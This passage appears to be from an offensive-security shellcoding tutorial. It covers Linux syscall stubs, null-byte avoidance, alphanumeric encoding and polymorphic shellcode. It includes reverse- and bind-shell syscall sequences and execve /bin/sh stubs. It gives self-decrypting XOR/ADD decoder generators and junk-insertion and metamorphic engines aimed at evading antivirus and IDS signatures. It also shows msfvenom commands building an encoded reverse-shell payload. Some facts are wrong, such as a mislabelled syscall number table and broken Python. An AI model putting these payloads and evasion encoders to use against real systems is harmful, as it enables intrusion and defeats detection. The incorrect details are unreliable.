mov rdi, 0x0000000000000001
mov rsi, 0x0000000000000001
mov rdx, 0x0000000000000001
syscall
```

**After (optimized):**

```asm
xor rax, rax
inc rax                ; RAX = 1
mov rdi, rax           ; RDI = 1
mov rsi, rax           ; RSI = 1
mov rdx, rax           ; RDX = 1
syscall
```

Size reduction: 28 bytes → 12 bytes

**Common shellcode patterns**

**Read file:**

```asm
open("/etc/passwd", O_RDONLY)
read(fd, buf, size)
write(1, buf, size)
```

**Reverse shell:**

```asm
socket(AF_INET, SOCK_STREAM)
connect(sock, attacker_addr)
dup2(sock, 0/1/2)  ; Redirect stdin/stdout/stderr
execve("/bin/sh", NULL, NULL)
```

**Bind shell:**

```asm
socket(AF_INET, SOCK_STREAM)
bind(sock, listen_addr)
listen(sock, backlog)
accept(sock)
dup2(accepted, 0/1/2)
execve("/bin/sh", NULL, NULL)
```

**Meterpreter-style staged:**

```asm
recv(sock, stage2_shellcode, size)
jmp stage2_shellcode
```

---

## Syscall Invocation

Syscalls transition from userspace to kernel, executing privileged operations. Understanding syscall mechanics enables crafting precise shellcode for specific system actions.

**Syscall mechanism (x86-64 Linux)**

Syscall number in RAX, arguments in RDI-R9:

```
Argument 1: RDI
Argument 2: RSI
Argument 3: RDX
Argument 4: RCX (but some syscalls use R10)
Argument 5: R8
Argument 6: R9
```

**Syscall instruction:**

```asm
mov rax, syscall_number
syscall                    ; Transition to kernel
; Return: RAX contains result (or -errno on error)
```

**Common syscall numbers (x86-64 Linux)**

```
0   : read
1   : write
2   : open
3   : close
4   : stat
9   : link
21  : access
39  : mkdir
59  : execve
60  : exit
85  : readlink
104 : setitimer
```

Complete list: `grep -r "define __NR" /usr/include/asm/unistd_64.h`

**Read syscall**

Read from file descriptor:

```c
ssize_t read(int fd, void *buf, size_t count)
```

Assembly:

```asm
mov rax, 0          ; read syscall
mov rdi, 3          ; fd = 3 (file descriptor)
lea rsi, [rel buf]  ; buf pointer
mov rdx, 256        ; count = 256 bytes
syscall
; RAX = bytes read
```

**Write syscall**

Write to file descriptor:

```c
ssize_t write(int fd, const void *buf, size_t count)
```

Assembly:

```asm
mov rax, 1          ; write syscall
mov rdi, 1          ; fd = 1 (stdout)
lea rsi, [rel buf]  ; buf pointer
mov rdx, 256        ; count = 256 bytes
syscall
```

**Open syscall**

Open file:

```c
int open(const char *pathname, int flags)
```

Assembly:

```asm
mov rax, 2          ; open syscall
lea rdi, [rel path] ; pathname
mov rsi, 0          ; flags = O_RDONLY
syscall
; RAX = file descriptor
```

**Close syscall**

```asm
mov rax, 3          ; close syscall
mov rdi, 3          ; fd
syscall
```

**Execve syscall**

Execute program:

```c
int execve(const char *filename, char *const argv[], char *const envp[])
```

Assembly (minimal):

```asm
mov rax, 59         ; execve syscall
lea rdi, [rel bin_sh]  ; filename = "/bin/sh"
xor rsi, rsi        ; argv = NULL
xor rdx, rdx        ; envp = NULL
syscall
```

With arguments:

```asm
mov rax, 59
lea rdi, [rel filename]
lea rsi, [rel argv_array]
xor rdx, rdx
syscall

; argv array:
argv_array:
    dq filename
    dq arg1
    dq 0  ; NULL terminator
```

**Exit syscall**

```asm
mov rax, 60         ; exit syscall
mov rdi, 0          ; exit code
syscall
```

**Socket syscall**

Create network socket:

```c
int socket(int domain, int type, int protocol)
```

Assembly:

```asm
mov rax, 41         ; socket syscall
mov rdi, 2          ; AF_INET
mov rsi, 1          ; SOCK_STREAM
xor rdx, rdx        ; protocol = 0
syscall
; RAX = socket fd
```

**Connect syscall**

Connect to remote address:

```c
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
```

Assembly:

```asm
mov rax, 42         ; connect syscall
mov rdi, 3          ; sockfd
lea rsi, [rel sockaddr]
mov rdx, 16         ; addrlen
syscall
```

Sockaddr structure (IPv4):

```asm
sockaddr:
    dw 2            ; sin_family = AF_INET (2)
    dw 0x5c11       ; sin_port = 4444 (big-endian)
    dd 0x0100007f   ; sin_addr = 127.0.0.1
    dq 0            ; sin_zero padding
```

**Mmap syscall**

Memory-map file or allocate memory:

```c
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
```

Assembly:

```asm
mov rax, 9          ; mmap syscall
mov rdi, 0          ; addr = 0 (kernel chooses)
mov rsi, 0x1000     ; length = 4096 bytes
mov rdx, 7          ; prot = PROT_READ|PROT_WRITE|PROT_EXEC
mov r10, 0x22       ; flags = MAP_PRIVATE|MAP_ANONYMOUS
mov r8, -1          ; fd = -1 (for anonymous mapping)
xor r9, r9          ; offset = 0
syscall
; RAX = mapped address
```

**Mprotect syscall**

Change page protections:

```c
int mprotect(void *addr, size_t len, int prot)
```

Assembly:

```asm
mov rax, 10         ; mprotect syscall
mov rdi, 0x601000   ; addr
mov rsi, 0x1000     ; len
mov rdx, 7          ; prot = PROT_RWX
syscall
```

**Dup2 syscall**

Duplicate file descriptor:

```c
int dup2(int oldfd, int newfd)
```

Assembly (redirect stdin/stdout/stderr):

```asm
mov rax, 33         ; dup2 syscall
mov rdi, 3          ; oldfd (socket)
mov rsi, 0          ; newfd = 0 (stdin)
syscall

mov rax, 33
mov rdi, 3
mov rsi, 1          ; newfd = 1 (stdout)
syscall

mov rax, 33
mov rdi, 3
mov rsi, 2          ; newfd = 2 (stderr)
syscall
```

**Prctl syscall**

Process control (seccomp, capabilities):

```c
int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
```

Assembly (disable seccomp):

```asm
mov rax, 157        ; prctl syscall
mov rdi, 15         ; PR_SET_SECCOMP
mov rsi, 0          ; Disable
syscall
```

**Madvise syscall**

Memory advice (MADV_HUGEPAGE, MADV_DONTFORK):

```asm
mov rax, 28         ; madvise syscall
mov rdi, addr
mov rsi, len
mov rdx, MADV_HUGEPAGE
syscall
```

**Seccomp filter installation (recent)**

```asm
mov rax, 318        ; seccomp syscall (x86-64)
mov rdi, SECCOMP_SET_MODE_FILTER
lea rsi, [rel filter]
syscall
```

**ARM syscall invocation**

ARM (32-bit):

```
R0-R5: Arguments
R7: Syscall number
SWI 0: Invoke syscall
Return: R0 = result
```

ARM64:

```
X0-X5: Arguments
X8: Syscall number
SVC 0: Invoke syscall
Return: X0 = result
```

**Error handling**

Syscall returns -errno on error (RAX < 0):

```asm
mov rax, 2          ; open
...
syscall
cmp rax, 0
jl error_handler     ; Jump if error (negative)
```

**Syscall optimization**

Minimize instructions:

```asm
; Inefficient
mov rax, 0x3c
mov rdi, 0x00
syscall

; Optimized
xor rax, rax
mov al, 0x3c        ; Smaller than mov rax, 0x3c
xor rdi, rdi
syscall
```

---

## Null-Byte Avoidance

Null bytes (`\x00`) terminate strings, breaking shellcode injection through strcpy() and similar functions. Avoiding null bytes requires careful instruction selection and encoding.

**Null-byte sources**

Common x86-64 instructions generating null bytes:

```asm
mov rax, 0          ; Contains \x00
push 0              ; Contains \x00
xor eax, eax        ; Generates \x00 in RAX (but instruction is null-free)
```

**Null-byte detection**

Check shellcode:

```python
shellcode = asm(shellcraft.sh())
if b'\x00' in shellcode:
    print("Contains null bytes!")
else:
    print("Clean!")
```

**Null-byte elimination strategies**

**Strategy 1: XOR clearing (instead of MOV 0)**

Instead of:

```asm
mov rax, 0          ; \x48\xc7\xc0\x00\x00\x00\x00
```

Use:

```asm
xor rax, rax        ; \x48\x31\xc0
```

**Strategy 2: Increment/decrement**

Instead of:

```asm
mov rax, 1          ; Contains \x00
```

Use:

```asm
xor rax, rax
inc rax             ; \x48\xff\xc0
```

**Strategy 3: Shift operations**

Instead of:

```asm
mov rax, 0x0100     ; Contains \x00
```

Use:

```asm
mov rax, 1
shl rax, 8          ; Shift left, no null bytes
```

**Strategy 4: Alternative encoding**

Use different but semantically equivalent instructions:

```asm
; Instead of: mov rax, 2 (has null byte variant)
xor rax, rax
mov al, 2           ; Smaller, no null in full instruction
```

**Strategy 5: String constants (little-endian)**

Embed strings avoiding null terminators:

```asm
; "/bin/sh" is 7 bytes, no nulls in valid UTF-8
mov rax, 0x68732f6e69622f  ; "/bin/sh" reversed
push rax
mov rdi, rsp        ; Point to "/bin/sh"
```

If string requires null terminator (C strings):

```asm
; "ls\0" would be: ls = \x6c\x73\x00
; Solution: emit without null, add at runtime

mov rax, 0x0000000000736c  ; "ls" padded
; or use push without null
```

**Strategy 6: Lea (load effective address)**

Position-independent without null bytes:

```asm
lea rsi, [rel string]  ; No null bytes
vs
mov rsi, 0x401234      ; May contain null
```

**Strategy 7: Indirect addressing**

Instead of:

```asm
mov rax, 0x401000   ; May have null bytes
mov [rax], rbx
```

Use:

```asm
lea rax, [rel data]
mov [rax], rbx
```

**Strategy 8: Rotate/shift zero creation**

Create zero without using literal 0:

```asm
mov rax, 1
shl rax, 64         ; Undefined behavior, but demonstrates technique
; Better approach: xor
```

**Null-byte identification in binary**

Disassemble and check:

```bash
objdump -d /path/to/binary | grep -E "\\x00"
```

Hexdump inspection:

```bash
objdump -d shellcode.bin | grep -o "00 00"
```

**Pwntools null-byte handling**

Generate null-free shellcode:

```python
from pwn import *

# Generate default shellcode
shellcode = asm(shellcraft.sh())

# Check for null bytes
if b'\x00' in shellcode:
    # Asm generated null bytes
    # Try alternative construction
    shellcode = asm("""
        xor rax, rax
        xor rdi, rdi
        mov al, 0x3b
        syscall
    """)

# Verify
assert b'\x00' not in shellcode
```

**Filter-based null avoidance**

After generating shellcode, remove nulls:

```python
def remove_nulls(code):
    """Encode code to remove null bytes"""
    # XOR encoding
    key = 0xff
    encoded = bytes(b ^ key for b in code)
    
    # Decoder stub must be null-free
    decoder = asm("""
        lea rsi, [rel encoded_payload]
        mov rcx, %d
        mov al, %d
    decode_loop:
        xor [rsi], al
        inc rsi
        loop decode_loop
        jmp encoded_payload
    """ % (len(encoded), key))
    
    return decoder + encoded
```

**Real-world null-byte constraints**

**Printf exploitation:**

```c
printf(user_input)  // String, null terminates
```

Null bytes terminate format string.

**Strcpy exploitation:**

```c
strcpy(buf, user_input)  // Null terminates
```

Null bytes stop copy.

**Network protocols:** Some protocols interpret null as delimiter or size indicator.

**Null-byte testing**

GDB verification:

```bash
gdb -q
(gdb) set disassembly-flavor intel
(gdb) file /dev/stdin <<< $(xxd -r -p <<< hexdump_of_shellcode)
(gdb) disassemble 0
```

Verify disassembly contains no `0x00` bytes.

---

## Alphanumeric Shellcode

Alphanumeric shellcode uses only ASCII printable characters (0x41-0x5a, 0x61-0x7a, 0x30-0x39), enabling exploitation through filters or write-up constraints.

**Alphanumeric constraints**

Valid bytes: `A-Z (0x41-0x5a)`, `a-z (0x61-0x7a)`, `0-9 (0x30-0x39)`

Invalid: Special characters, null bytes, control characters.

**Alphanumeric instruction encoding**

Most x86 instructions can't be expressed in alphanumeric bytes. Solution: Use decoder stub creating arbitrary instructions.

**Common alphanumeric gadgets**

Limited instructions encodable:

```
0x41: inc ecx (0x41 with certain prefixes)
0x48: dec eax / rex.W prefix
0x50-0x59: push r/pop r
0x90: nop
```

**Decoder stub approach**

Use alphanumeric bytes to:

1. Set register containing key
2. Decrypt embedded payload
3. Jump to payload

**Simple XOR decoder (alphanumeric):**

```python
# Pseudocode for alphanumeric decoder
# Problem: Most instructions not alphanumeric

# Solution: Use only alphanumeric-encodable instructions
# or chain gadgets

encoded_shellcode = b'encoded_bytes_here'
decoder_stub = b'A' * 20  # Placeholder alphanumeric bytes
```

[Unverified] Creating fully alphanumeric shellcode for x86-64 is theoretically possible but extremely complex, typically requiring:

- Gadget chains
- Stack manipulation
- Encoding/decoding schemes

**Practical alphanumeric approaches**

**Approach 1: Polyglot encoding**

Shellcode appearing valid in multiple contexts:

```python
# HTML comment appearing as JavaScript
<!--
alert('xss')
//-->

# Similarly, alphanumeric appearing as valid code
```

**Approach 2: JIT compilation bypass**

Use JavaScript's function constructor:

```javascript
Function("shellcode_here")()
```

**Approach 3: URL encoding**

Many filters only block non-printable, alphanumeric passes:

```
%41%42%43 = ABC (easily decoded)
```

**Approach 4: Stack manipulation gadgets**

Chain gadgets to build instructions:

```python
# Gadget 1: push 0x41
# Gadget 2: pop rax
# Gadget 3: add rax, rbx
# ...
# Build arbitrary instruction sequence
```

**X86 alphanumeric analysis**

Check which instructions encode as alphanumeric:

```python
import capstone

# Try all byte values 0x41-0x5a, 0x61-0x7a, 0x30-0x39
for byte_val in range(0x41, 0x5b) + range(0x61, 0x7b) + range(0x30, 0x3a):
    try:
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        for insn in md.disasm(bytes([byte_val]), 0):
            if insn.mnemonic:
                print(f"0x{byte_val:02x}: {insn.mnemonic} {insn.op_str}")
    except:
        pass
```

**ARM alphanumeric encoding**

ARM Thumb mode instructions more alphanumeric-friendly:

```python
context.arch = 'arm'
context.thumb = True

# Some Thumb instructions encode in alphanumeric range
```

**Practical alphanumeric shellcode for web exploitation**

XSS filter bypass using alphanumeric:

```html
<!-- Exploit JavaScript with only alphanumeric -->
<iframe src="javascript:String.fromCharCode(...)"></iframe>
```

**Pwntools alphanumeric generation**

```python
from pwn import *

# Check if shellcode contains non-alphanumeric
shellcode = asm(shellcraft.sh())

def is_alphanumeric(data):
    allowed = set(b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')
    return all(bytes([b]) in allowed for b in data)

if is_alphanumeric(shellcode):
    print("Pure alphanumeric!")
else:
    print("Contains non-alphanumeric bytes")
```

**Encoding schemes for alphanumeric**

**Base64 encoding (if decoder available):**

```python
import base64

shellcode = asm(shellcraft.sh())
encoded = base64.b64encode(shellcode)
# encoded now contains only A-Za-z0-9+/=
# Still contains non-alphanumeric (+/=)
```

**Hex encoding (requires decoder):**

```python
shellcode = asm(shellcraft.sh())
hex_encoded = shellcode.hex()  # Only 0-9a-f
# All alphanumeric!
```

Decoder needs to convert hex back to binary.

**Case manipulation**

JavaScript/URL context allows case changes:

```javascript
// Upper/lower case both execute identically
alert() == ALERT  // Context-dependent
```

**Concatenation attacks**

Build alphanumeric payload through string concatenation:

```javascript
x='A'+'l'+'e'+'r'+'t'  // Builds 'Alert'
```

**Environment-specific alphanumeric**

**SQL injection:**

```sql
SELECT * FROM users WHERE id='1' OR '1'='1'
; All alphanumeric usable in context
```

**Command injection:**

```bash
; cat/bin/sh  ; Alphanumeric commands
```

**Regular expression:**

```regex
[A-Za-z0-9]  ; Pattern matching alphanumeric
```

**Hybrid approach: Partial alphanumeric**

When full alphanumeric infeasible, minimize non-alphanumeric:

```python
shellcode = asm(shellcraft.sh())
non_alnum = [b for b in shellcode if b not in b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']

# Minimize count
print(f"Non-alphanumeric bytes: {len(non_alnum)}")
```

**Real-world alphanumeric shellcode usage**

**XSS (Cross-Site Scripting) filters:**

Many filters block non-alphanumeric characters in JavaScript context, requiring alphanumeric payloads.

**SQL injection escapes:**

Database filters sometimes only allow alphanumeric in specific contexts.

**Command line injection:**

Shell command interpretation of alphanumeric-only input.

**Detection in CTF challenges**

Problem statements often specify:

- "Generate alphanumeric shellcode"
- "Bypass alphanumeric filter"
- "Write shellcode < 20 bytes (forces optimization)"

**Alphanumeric shellcode generation tools**

**Metasploit encoder (msfvenom):**

```bash
msfvenom -p linux/x64/exec CMD=/bin/sh -e x86/alphanumeric -f python
```

Attempts alphanumeric encoding, though complex.

**Pwntools codec:**

```python
from pwn import *

# Attempt encoding
shellcode = asm(shellcraft.sh())
encoded = encode(shellcode, 'alphanumeric')  # [Unverified - not standard]
```

**Manual gadget chaining:**

For true alphanumeric constraints, chain existing alphanumeric instructions or use decoder stubs accepting only alphanumeric input.

---

**Related shellcoding subtopics essential for comprehensive payload development:** Egg hunter techniques for locating relocated shellcode in memory, multistage payload generation enabling complex functionality within size constraints, and architecture-specific shellcode optimization for ARM, MIPS, and PowerPC targets enabling cross-platform exploitation.

---

## Polymorphic Shellcode

### Concept and Purpose

**Definition:** Shellcode that changes its appearance while maintaining functionality, evading signature-based detection systems.

**Why Polymorphism:**

- Bypass antivirus/IDS signatures
- Evade pattern matching
- Circumvent bad character filters
- Defeat static analysis

**Types of Polymorphism:**

1. **Register Substitution:** Use different registers for same operations
2. **Instruction Substitution:** Use equivalent instructions
3. **Junk Code Insertion:** Add non-functional instructions
4. **Encryption/Encoding:** Encrypt payload with variable decoder

### Basic Polymorphic Techniques

#### Technique 1: Register Substitution

**Original Shellcode:**

```nasm
xor eax, eax    ; Zero EAX
push eax        ; Push NULL
```

**Polymorphic Variants:**

```nasm
; Variant 1: Use different register
xor ebx, ebx
push ebx

; Variant 2: Use sub instead of xor
sub ecx, ecx
push ecx

; Variant 3: Use mov
mov edx, 0
push edx

; Variant 4: Use and
and esi, 0
push esi
```

**Implementation:**

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

def polymorphic_zero_register():
    """Generate polymorphic code to zero a register"""
    registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']
    reg = random.choice(registers)
    
    methods = [
        f"xor {reg}, {reg}",
        f"sub {reg}, {reg}",
        f"and {reg}, 0",
        f"mov {reg}, 0"
    ]
    
    return asm(random.choice(methods))

# Generate 5 different variants
for i in range(5):
    code = polymorphic_zero_register()
    print(f"Variant {i+1}: {disasm(code)}")
    print(f"Bytes: {code.hex()}\n")
```

#### Technique 2: Instruction Substitution

**Equivalent Instructions:**

```nasm
; Moving zero to register
xor eax, eax        ; 31 C0
sub eax, eax        ; 29 C0
and eax, 0          ; 83 E0 00
mov eax, 0          ; B8 00 00 00 00
mul ebx             ; F7 E3 (if ebx=0, result in eax=0)
imul eax, eax, 0    ; 6B C0 00

; Incrementing register
inc eax             ; 40
add eax, 1          ; 83 C0 01
lea eax, [eax+1]    ; 8D 40 01

; NOPs (various forms)
nop                 ; 90
xchg eax, eax       ; 90 (same opcode)
mov eax, eax        ; 89 C0
lea eax, [eax+0]    ; 8D 40 00
```

**Generator:**

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

class PolymorphicGenerator:
    def __init__(self):
        self.registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']
    
    def zero_register(self, reg=None):
        """Generate code to zero a register"""
        if reg is None:
            reg = random.choice(self.registers)
        
        options = [
            f"xor {reg}, {reg}",
            f"sub {reg}, {reg}",
            f"and {reg}, 0"
        ]
        return asm(random.choice(options))
    
    def increment(self, reg):
        """Generate code to increment register"""
        options = [
            f"inc {reg}",
            f"add {reg}, 1",
            f"lea {reg}, [{reg}+1]"
        ]
        return asm(random.choice(options))
    
    def nop_equivalent(self):
        """Generate NOP-equivalent instruction"""
        options = [
            "nop",
            "xchg eax, eax",
            "mov eax, eax",
            "lea eax, [eax]"
        ]
        return asm(random.choice(options))
    
    def junk_instruction(self):
        """Generate harmless junk instruction"""
        reg1 = random.choice(self.registers)
        reg2 = random.choice(self.registers)
        
        # Operations that don't affect execution
        options = [
            f"mov {reg1}, {reg1}",  # No-op move
            f"test {reg1}, {reg1}",  # Flags only
            f"cmp {reg1}, {reg1}",   # Always equal
        ]
        return asm(random.choice(options))

# Usage
gen = PolymorphicGenerator()

print("10 different ways to zero EAX:")
for i in range(10):
    code = gen.zero_register('eax')
    print(f"{i+1}. {disasm(code).strip()} -> {code.hex()}")
```

#### Technique 3: Junk Code Insertion

**Concept:** Insert non-functional instructions between real shellcode.

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

def insert_junk(shellcode, junk_density=0.3):
    """
    Insert junk instructions into shellcode
    junk_density: probability of inserting junk after each instruction
    """
    instructions = disasm(shellcode).split('\n')
    result = b""
    
    for instr in instructions:
        if not instr.strip():
            continue
        
        # Add original instruction
        result += asm(instr.split(':')[1].strip())
        
        # Randomly add junk
        if random.random() < junk_density:
            junk_options = [
                "nop",
                "xchg eax, eax",
                "push eax\npop eax",
                "test eax, eax",
                "cmp ebx, ebx"
            ]
            junk = random.choice(junk_options)
            result += asm(junk)
    
    return result

# Original shellcode (simple example)
original = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov ecx, eax
    mov edx, eax
    mov al, 11
    int 0x80
""")

print("Original shellcode:")
print(disasm(original))
print(f"Size: {len(original)} bytes\n")

# Polymorphic version with junk
polymorphic = insert_junk(original, junk_density=0.5)

print("Polymorphic shellcode with junk:")
print(disasm(polymorphic))
print(f"Size: {len(polymorphic)} bytes")
```

#### Technique 4: Self-Decrypting Shellcode

**Concept:** Encrypt payload, prepend decoder stub that decrypts at runtime.

**XOR Encoder/Decoder:**

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

def xor_encode(shellcode, key=None):
    """XOR encode shellcode with random key"""
    if key is None:
        key = random.randint(1, 255)
    
    encoded = bytes([b ^ key for b in shellcode])
    return encoded, key

def generate_xor_decoder(key, shellcode_len):
    """Generate decoder stub for XOR-encoded shellcode"""
    decoder = f"""
    start:
        jmp short get_address
    
    decoder:
        pop esi                  ; ESI = address of encoded shellcode
        xor ecx, ecx
        mov cl, {shellcode_len}  ; Counter
    
    decode_loop:
        xor byte ptr [esi], {key}
        inc esi
        loop decode_loop
        
        jmp short start + {len(asm('jmp short get_address')) + len(asm('pop esi'))}
    
    get_address:
        call decoder
    """
    return asm(decoder)

# Example: Encode execve shellcode
original_shellcode = asm(shellcraft.i386.linux.sh())

print("Original shellcode:")
print(f"Size: {len(original_shellcode)} bytes")
print(f"Bytes: {original_shellcode.hex()}\n")

# Encode
encoded_shellcode, key = xor_encode(original_shellcode)

print(f"Encoded with key: {hex(key)}")
print(f"Encoded bytes: {encoded_shellcode.hex()}\n")

# Generate decoder
decoder = generate_xor_decoder(key, len(original_shellcode))

# Complete polymorphic shellcode
complete_shellcode = decoder + encoded_shellcode

print("Complete self-decrypting shellcode:")
print(f"Total size: {len(complete_shellcode)} bytes")
print(disasm(complete_shellcode))
```

**Advanced XOR Decoder (No Null Bytes):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def xor_decoder_stub(key, length):
    """
    Generate XOR decoder without null bytes
    Uses jmp-call-pop technique to get shellcode address
    """
    decoder = f"""
    decoder_start:
        jmp short call_decoder
    
    decoder:
        pop esi                      ; ESI = encoded shellcode address
        push esi                     ; Save for later jump
        xor ecx, ecx
        mov cl, {length & 0xFF}      ; Counter (low byte)
        {'mov ch, ' + str((length >> 8) & 0xFF) if length > 255 else ''}
    
    decode_loop:
        xor byte ptr [esi], {key}
        inc esi
        dec ecx
        jnz decode_loop
        
        ret                          ; Jump to decoded shellcode
    
    call_decoder:
        call decoder
    """
    return asm(decoder)

# Usage
shellcode = asm(shellcraft.i386.linux.sh())
key = 0xAA
encoded = bytes([b ^ key for b in shellcode])

decoder = xor_decoder_stub(key, len(shellcode))
final = decoder + encoded

print("Decoder stub:")
print(disasm(decoder))
print(f"\nFinal shellcode size: {len(final)} bytes")

# Test for null bytes
if b'\x00' in final:
    print("WARNING: Contains null bytes!")
else:
    print("SUCCESS: No null bytes")
```

#### Technique 5: ADD/SUB Encoder

**Concept:** Encode using ADD/SUB instead of XOR to create different signature.

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

def add_encode(shellcode, key=None):
    """Encode shellcode using ADD operation"""
    if key is None:
        key = random.randint(1, 255)
    
    encoded = bytes([(b + key) & 0xFF for b in shellcode])
    return encoded, key

def generate_add_decoder(key, shellcode_len):
    """Generate decoder for ADD-encoded shellcode"""
    # To decode: subtract the key
    decoder = f"""
    start:
        jmp short get_address
    
    decoder:
        pop esi
        xor ecx, ecx
        mov cl, {shellcode_len}
    
    decode_loop:
        sub byte ptr [esi], {key}
        inc esi
        loop decode_loop
        
        jmp short start + 2
    
    get_address:
        call decoder
    """
    return asm(decoder)

# Usage
original = asm(shellcraft.i386.linux.sh())
encoded, key = add_encode(original)

decoder = generate_add_decoder(key, len(original))
final = decoder + encoded

print(f"ADD-encoded with key: {hex(key)}")
print(f"Decoder size: {len(decoder)} bytes")
print(f"Total size: {len(final)} bytes")
```

### Advanced Polymorphic Techniques

#### Multi-Layer Encoding

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

def multi_layer_encode(shellcode, layers=3):
    """
    Apply multiple layers of different encoding
    Each layer uses different algorithm and key
    """
    current = shellcode
    decoders = []
    
    encoding_methods = [
        ('xor', lambda data, key: bytes([b ^ key for b in data])),
        ('add', lambda data, key: bytes([(b + key) & 0xFF for b in data])),
        ('sub', lambda data, key: bytes([(b - key) & 0xFF for b in data])),
        ('rol', lambda data, key: bytes([((b << key) | (b >> (8 - key))) & 0xFF for b in data]))
    ]
    
    for layer in range(layers):
        method_name, encoder = random.choice(encoding_methods)
        key = random.randint(1, 15)
        
        # Encode
        current = encoder(current, key)
        
        # Store decoder info (would generate actual decoder stub)
        decoders.append((method_name, key, len(current)))
        
        log.info(f"Layer {layer + 1}: {method_name.upper()} with key {hex(key)}")
    
    # Generate decoder stubs (simplified)
    # In practice, generate actual assembly for each layer
    # Decoders execute in reverse order
    
    return current, decoders

# Example
original = asm(shellcraft.i386.linux.sh())
encoded, layers = multi_layer_encode(original, layers=3)

print(f"\nOriginal size: {len(original)} bytes")
print(f"Encoded size: {len(encoded)} bytes")
print(f"Layers: {len(layers)}")
```

#### Metamorphic Engine

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

class MetamorphicEngine:
    """
    Advanced polymorphic engine that completely rewrites shellcode
    while maintaining functionality
    """
    
    def __init__(self):
        self.registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']
        self.scratch_regs = []
    
    def allocate_register(self):
        """Allocate a random register for use"""
        reg = random.choice([r for r in self.registers if r not in self.scratch_regs])
        self.scratch_regs.append(reg)
        return reg
    
    def free_register(self, reg):
        """Free a register"""
        if reg in self.scratch_regs:
            self.scratch_regs.remove(reg)
    
    def generate_zero(self, reg):
        """Generate polymorphic code to zero register"""
        methods = [
            f"xor {reg}, {reg}",
            f"sub {reg}, {reg}",
            f"and {reg}, 0",
            f"mov {reg}, 0",
            f"push 0\npop {reg}"
        ]
        return random.choice(methods)
    
    def generate_load_value(self, reg, value):
        """Generate polymorphic code to load value into register"""
        if value == 0:
            return self.generate_zero(reg)
        
        methods = []
        
        # Direct mov
        methods.append(f"mov {reg}, {value}")
        
        # XOR + ADD
        if value < 256:
            methods.append(f"xor {reg}, {reg}\nadd {reg}, {value}")
        
        # Push + Pop
        methods.append(f"push {value}\npop {reg}")
        
        # Complex arithmetic
        if value > 10:
            part1 = random.randint(1, value - 1)
            part2 = value - part1
            methods.append(f"mov {reg}, {part1}\nadd {reg}, {part2}")
        
        return random.choice(methods)
    
    def rewrite_shellcode(self, shellcode):
        """
        Completely rewrite shellcode with polymorphic equivalent
        This is simplified - real implementation would parse instructions
        """
        # Parse original instructions
        instructions = disasm(shellcode).split('\n')
        
        result = ""
        for instr in instructions:
            if not instr.strip() or ':' not in instr:
                continue
            
            # Extract instruction
            code = instr.split(':')[1].strip()
            
            # Add junk before some instructions
            if random.random() < 0.3:
                result += "nop\n"
            
            # Rewrite instruction (simplified)
            result += code + "\n"
            
            # Add junk after some instructions
            if random.random() < 0.2:
                result += "test eax, eax\n"
        
        return asm(result)

# Usage
engine = MetamorphicEngine()

original = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
""")

print("Original:")
print(disasm(original))

morphed = engine.rewrite_shellcode(original)
print("\nMetamorphic version:")
print(disasm(morphed))
```

### Polymorphic Shellcode Tools

**Using msfvenom with encoders:**

```bash
# List available encoders
msfvenom --list encoders

# Generate with single encoder
msfvenom -p linux/x86/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x86/shikata_ga_nai \
    -f python

# Multiple iterations for stronger polymorphism
msfvenom -p linux/x86/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x86/shikata_ga_nai -i 10 \
    -f c

# Chain multiple encoders
msfvenom -p linux/x86/exec CMD=/bin/sh \
    -e x86/countdown -e x86/shikata_ga_nai \
    -f raw -o encoded.bin
```

**Common MSF Encoders:**

```
x86/shikata_ga_nai    - Polymorphic XOR additive feedback (best)
x86/call4_dword_xor   - Call+4 Dword XOR Encoder
x86/countdown         - Single-byte XOR Countdown Encoder
x86/fnstenv_mov       - Variable-length Fnstenv/mov Dword XOR Encoder
x86/jmp_call_additive - Jump/Call XOR Additive Feedback Encoder
```

**Custom Python Polymorphic Generator:**

```python
#!/usr/bin/env python3
from pwn import *
import random
import string

context.arch = 'i386'

class AdvancedPolymorphicGenerator:
    def __init__(self, shellcode):
        self.original = shellcode
        self.mutations = []
    
    def mutate_registers(self, code):
        """Randomly swap registers"""
        reg_map = {
            'eax': random.choice(['eax', 'ebx', 'ecx']),
            'ebx': random.choice(['ebx', 'edx', 'esi']),
            'ecx': random.choice(['ecx', 'edi', 'eax']),
        }
        
        # Apply mapping (simplified)
        for old, new in reg_map.items():
            code = code.replace(old, new)
        
        return code
    
    def insert_garbage(self, asm_code):
        """Insert garbage instructions"""
        lines = asm_code.split('\n')
        result = []
        
        for line in lines:
            result.append(line)
            if random.random() < 0.3:
                garbage = random.choice([
                    "nop",
                    "xchg eax, eax",
                    "push eax\npop eax",
                    "mov eax, eax"
                ])
                result.append(garbage)
        
        return '\n'.join(result)
    
    def apply_encoding(self, shellcode, method='xor'):
        """Apply encoding layer"""
        key = random.randint(1, 255)
        
        if method == 'xor':
            encoded = bytes([b ^ key for b in shellcode])
        elif method == 'add':
            encoded = bytes([(b + key) & 0xFF for b in shellcode])
        elif method == 'sub':
            encoded = bytes([(256 - ((256 - b + key) % 256)) & 0xFF for b in shellcode])
        else:
            encoded = shellcode
        
